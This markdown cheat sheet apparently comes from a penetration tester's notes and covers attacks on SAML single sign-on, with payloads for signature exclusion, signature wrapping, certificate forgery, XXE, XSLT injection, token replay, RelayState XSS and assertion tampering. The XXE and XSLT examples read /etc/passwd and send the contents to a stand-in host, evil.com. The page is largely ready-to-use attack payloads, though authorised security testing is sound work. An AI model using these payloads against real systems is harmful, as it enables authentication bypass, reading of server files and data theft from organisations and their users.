---
tags:
  - high
  - logic
---

# SAML Vulnerabilities

SAML attacks exploit XML signature verification flaws, enabling authentication bypass through signature wrapping, XXE, certificate forgery, and assertion manipulation.

## Quick Test

```
# Remove signature → Does it still work?
# Use SAML Raider Burp extension for automated attacks
```

## SAML Flow

```
1. SP (Service Provider) initiates auth request
2. User redirected to IdP (Identity Provider)
3. IdP authenticates, returns SAMLResponse
4. SP validates response, grants access
```

**Key endpoints:** `/saml/`, `/sso/`, `/acs/`

## Attack Vectors

### 1. Signature Exclusion

Remove signature entirely and check if validated:

```xml
<samlp:Response>
  <!-- No Signature element -->
  <saml:Assertion>
    <!-- Attacker-controlled claims -->
  </saml:Assertion>
</samlp:Response>
```

**SAML Raider:** Intercept → "Remove Signatures" → Modify → Forward

### 2. XML Signature Wrapping (XSW)

Signature validates one element, code uses another:

**XSW #1 — New root element:**
```xml
<NewRoot>
  <samlp:Response ID="evil">
    <saml:Assertion>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Assertion>
  </samlp:Response>
  <samlp:Response ID="original">
    <ds:Signature><!-- Signs original --></ds:Signature>
    <saml:Assertion>
      <saml:NameID>user@target.com</saml:NameID>
    </saml:Assertion>
  </samlp:Response>
</NewRoot>
```

**XSW #2 — Detached signature:**
```xml
<samlp:Response>
  <saml:Assertion ID="evil">admin</saml:Assertion>
  <saml:Assertion ID="original">
    <ds:Signature URI="#original"/>
    user
  </saml:Assertion>
</samlp:Response>
```

### 3. Certificate Forgery

```bash
# Generate self-signed cert
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout attacker.key -out attacker.crt

# SAML Raider: Send cert → Save and Self-Sign → Re-sign
```

If SP trusts any cert, bypass achieved.

### 4. XXE Injection

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:Response>
```

**OOB exfiltration:**
```xml
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">
  %dtd;
]>
```

### 5. XSLT Injection

```xml
<ds:Signature>
  <ds:Transforms>
    <ds:Transform>
      <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="doc">
          <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
          <xsl:value-of select="unparsed-text(concat('http://evil.com/',$file))"/>
        </xsl:template>
      </xsl:stylesheet>
    </ds:Transform>
  </ds:Transforms>
</ds:Signature>
```

### 6. Token Recipient Confusion

Replay SAML response from one SP to another:

```
1. Login to SP-Legit via shared IdP
2. Intercept SAML Response
3. Replay to SP-Target
4. SP-Target accepts if no audience validation
```

### 7. RelayState Injection (XSS)

```http
POST /cgi/logout HTTP/1.1

SAMLResponse=[valid]&RelayState=%0AContent-Type:%20text/html%0A%0A<svg/onload=alert(1)>
```

### 8. Assertion Manipulation

```xml
<!-- Change NameID -->
<saml:NameID>admin@target.com</saml:NameID>

<!-- Add admin role -->
<saml:Attribute Name="role">
  <saml:AttributeValue>admin</saml:AttributeValue>
</saml:Attribute>
```

## Bypasses

**Signature position:**
```xml
<!-- Before/after/inside assertion -->
<!-- Outside response envelope -->
```

**Encoding tricks:**
```
# Base64 variations
# Deflate compression
# URL encoding
```

## Real Examples

| Target | Technique | Impact |
|--------|-----------|--------|
| Rocket.Chat | Signature checked on first element only | Auth bypass |
| Uber | SAMLExtractor found 20+ vulnerable subdomains | Mass XSS |

## Tools

- **[SAML Raider](https://github.com/SAMLRaider/SAMLRaider)** — Burp extension for all SAML attacks
- **[SAMLExtractor](https://github.com/fadyosman/SAMLExtractor)** — Find SAML endpoints
- **xmlsec** — XML signature verification

## Checklist

- [ ] Remove signature, test if validated
- [ ] Try XML Signature Wrapping (XSW #1-8)
- [ ] Test certificate forgery (self-signed)
- [ ] Check for XXE in SAML response
- [ ] Test XSLT injection in transforms
- [ ] Try token replay attacks
- [ ] Check Recipient/Audience validation
- [ ] Test assertion manipulation
- [ ] Check RelayState for injection
- [ ] Verify Destination validation
